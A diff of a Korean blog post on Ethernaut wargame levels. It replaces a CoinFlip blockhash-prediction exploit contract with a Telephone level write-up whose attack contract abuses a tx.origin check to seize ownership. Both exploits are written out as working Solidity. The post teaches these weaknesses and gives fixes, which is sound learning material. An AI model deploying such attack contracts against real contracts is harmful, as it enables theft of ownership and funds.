@@ -9,7 +9,7 @@ categories: 취약점분석
 
 
 # 👋 1. CoinFlip
-__Difficulty 3/10__
+__Difficulty 1/10__
 
 - 승리 조건
 - 코드 분석
@@ -19,7 +19,7 @@ __Difficulty 3/10__
 - - -
 
 ## 승리 조건
-- 동전 뒤집기 게임에서 10번 연속 예측 성공하기
+- Ownership 뺐어오기
 
 - - -
 
@@ -30,54 +30,24 @@ __Difficulty 3/10__
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import '@openzeppelin/contracts/math/SafeMath.sol';
+contract Telephone {
 
-contract CoinFlip {
+    //owner의 주소
+    address public owner;
 
-  using SafeMath for uint256;
-  // 연속 win의 수
-  uint256 public consecutiveWins;
-  // 이전 flip()에 사용됐던 hash 값 
-  uint256 lastHash;
-  // 난수 생성을 위한 값
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-  
-  //constructor: consecutiveWins 초기 값을 0으로 setting
-  constructor() public {
-    consecutiveWins = 0;
-  }
-
-  //동전 뒤집기 예측을 위한 function
-  //return boolean
-  function flip(bool _guess) public returns (bool) {
-    // blockValue에 last blockhash를 uint256으로 casting해 저장한다
-    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-
-    //만약 이전 게임에서 사용했던 hash라면 답이 같을 수 있음으로 revert한다
-    if (lastHash == blockValue) {
-      revert();
+    //constructor
+    constructor() public {
+        //setting owner as deployer
+        owner = msg.sender;
     }
-    
-    // 이번 게임에서 사용 될 hash를 저장
-    lastHash = blockValue;
-    //blockValue를 FACTOR로 나눈 값을 coinFilip에 저장한다.
-    uint256 coinFlip = blockValue.div(FACTOR);
-    // coinFlip의 숫자와 1이 같으면 side에 true, 다르면 false를 저장한다.
-    bool side = coinFlip == 1 ? true : false;
 
-    // 만약 side와 _guess가 같다면 실행, 즉 user의 예측이 맞았다면 실행
-    if (side == _guess) {
-      // 연속 win의 수에 1을 더한다
-      consecutiveWins++;
-      return true;
-    } 
-    // 만약 side와 _guess가 다르다면 실행, 즉 user의 예측이 틀렸다면 실행
-    else {
-      // 연속 win의 수를 초기화 시킨다.
-      consecutiveWins = 0;
-      return false;
+    //owner를 바꿀 수 있는 function
+    function changeOwner(address _owner) public {
+        // 만약 tx.origin과 msg.sender이 다르면 owner를 parameter의 주소로 바꿀 수 있다.
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
     }
-  }
 }
 ```
 - - -
@@ -92,76 +62,60 @@ remix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 �
 
 
 ## 풀이
-이 문제는 random으로 생성되는 값을 연속해서 맞추는 것이다.
-그리고 이 문제에서 주목해야 할 점은 randomness이다.
+이 문제에서 우리는 ownership을 뺐어와야 한다.
 
-solidity를 사용하여 randomness를 생성하는 것은 매우 까다롭고 대부분의 방법은 hacking 당하기 쉽다. 그래서 randomness를 생성하는 곳을 파고들어야 한다.
+그리고 우리는 코드분석에서 봤듯이 ownership을 가져올 수 있는 방법은 changeOwner()를 call하여 조건을 만족시키면 된다.
 
-이 CoinFlip contract에서는 미리 정해진 FACTOR과 이전 block의 hash를 사용하여 randomness를 생성한다.
+여기서 우리가 이해 해야할 점은 tx.origin과 msg.sender의 차이다.
 
-blockhash의 특징은 무엇일까? 우선 blockhash는 트랜잭션이 추가된 block의 hash 값이다. 즉 같은 block에 있는 transaction은 같은 blockhash를 가진다.
+tx.origin과 msg.sender의 차이는 __[이 글](https://holyhansss.github.io/vulnerability/tx.origin/tx_origin/)__ 에서 찾아볼수 있다.
 
-그렇다면 우리가 같은 block에 transaction을 보낸다면 해킹이 가능 할 것이다!
+만약 그래도 이해가 안된다면 서칭 고고!!
 
-나는 그래서 CoinFlipAttack contract를 새로 만들었다. 
+이해가 되었다면 이제 어떻게 풀지 감이 올 것이라고 생각한다.
 
-주석을 통해 CoinFlipAttack contract를 같이 분석 해보자!
+__바로 Telephone.changeOwner()를 call하는 contract를 하나 더 만들어서 실행시키면 된다!__
+
+
+주석을 통해 TelephoneAttack contract를 같이 분석 해보자!
+최대한 간단하게 만들어보았다.
 ```solidity
-//아마 위해서 본 CoinFlip contract와 매우 비슷할 것이다.
-contract CoinFlipAttack {
+contract TelephoneAttack {
+    //Telephone contract의 address가 들어갈 곳
+    address telephone;
 
-  using SafeMath for uint256;
-  uint256 public consecutiveWins;
-  uint256 public lastHash;
-  // CoinFlip.flip()의 결과를 예측하기 위해 같은 FACTOR를 쓴다.
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-  //CoinFlip contract의 address
-  address coinFlipAddress;
-
-  //contructor: 배포시 CoinFlip의 address를 포함해 배포한다.
-  constructor(address _coinFlipAddress) public {
-    consecutiveWins = 0;
-    //coinFlipAddress를 CoinFlip의 address로 설정한다.
-    coinFlipAddress = _coinFlipAddress;
-  }
-
-  function flip() public {
-    //CounFlip contract와 똑같이 blockValue를 생성한다.
-    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-
-    if (lastHash == blockValue) {
-      revert();
+    //constructor: TelephoneAttack의 주소를 parameter로 사용한다.
+    constructor(address _telephone) public {
+        telephone  = _telephone;
     }
-
-    lastHash = blockValue;
-    //CounFlip contract와 똑같이 conFlip 값을 생성한다.
-    uint256 coinFlip = blockValue.div(FACTOR);
-    bool side = coinFlip == 1 ? true : false;
-    이미 맞춘 값을 CoinFlip.flip에 보내 해킹한다.
-    CoinFlip(coinFlipAddress).flip(side);
-
-  }
+    
+    //Telephone contract를 공격하는 function
+    //실제 공격해서 돈을 빼온다고 생각해 payable을 넣었다!
+    function attack() public payable{
+        //Telephone contract의 changeOwner를 parameter(msg.sender)와 함께 call한다.
+        Telephone(telephone).changeOwner(msg.sender);
+    }
 }
-
 ```
 
-즉 CoinFlipAttack.flip()을 다른 블록에 10번 call하면 해킹에 성공하게 된다.
+Remix에서 Injected Web3 선택해 위 contract를 deploy하고 attack()을 누르면 ownership을 가져올 수 있다. 
 
-
-완료 후 Submit instance를 누르고 조금 기다리면 block이 mine되고,
+완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
 ```
 ٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
 ```
-
 - - -
 ## 마무리
-solidity에서 randomness를 생성하는 것은 까다롭다. block.timestamp, block.hash등을 사용할 수 있지만 이는 모두 예측이 가능하다. 그래서 contract에서 randomness를 생성하는 것이 아니라 외부에 가져오는 것이 좋다. Openzeppline에서는 Chainlink VRF, RANDAO, Oraclize를 사용하는 것을 권장하고 있다. 앞으로 randomness를 만들때 조심하자! 
+tx.origin은 Ethereum official Docs에서도 사용하지 않을 것을 권장하고 있다. 또한 tx.origin 대신 msg.sender를 사용하기를 권장한다. tx.origin의 기능을 대부분 msg.sender가 대신 처리할 수 있기 때문이다. 정말정말정말정말 tx.origin을 사용해야하는 경우가 아니라면 그냥 안전하게 msg.sender를 사용하자!
 
+그냥 나의 느낌인데 취약점을 공부하고 풀어보니 어떻게 풀지 감이 잡힌다. ethernaut이후에 직접 test과 다른 contract의 취약점을 직접 찾아보고 싶다. ~~찾아서 알려주면 내 경력+1 ㅋㅋㅋ~~
 - - -
 ## 기타 정보
 - rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
 - ethernaut: https://ethernaut.openzeppelin.com/
 - remix IDE: https://remix.ethereum.org
+- tx.origin 취약점: https://holyhansss.github.io/vulnerability/tx.origin/tx_origin/
+
 ```toc
 
 ```
